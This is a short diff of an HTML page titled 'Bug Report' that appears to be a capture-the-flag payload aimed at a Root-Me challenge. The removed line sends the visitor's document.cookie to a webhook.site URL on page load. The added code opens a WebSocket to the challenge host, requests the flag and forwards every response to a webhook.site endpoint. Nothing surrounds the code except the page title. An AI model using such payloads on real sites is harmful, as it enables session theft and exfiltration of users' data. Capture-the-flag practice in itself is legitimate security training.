@@ -5,7 +5,13 @@
     <title>Bug Report</title>
     <script>
       window.onload = function() {
-        new Image().src = "https://webhook.site/0693fa2b-5ed3-439e-8073-32e3b5e1e1f9?cookie=" + encodeURIComponent(document.cookie);
+        let ws = new WebSocket("ws://ctf19.root-me.org/ws");
+        ws.onopen = () => {
+          ws.send("flag");
+        };
+        ws.onmessage = (e) => {
+          fetch("https://webhook.site/TON_ID?data=" + encodeURIComponent(e.data));
+        };
       };
     </script>
   </head>
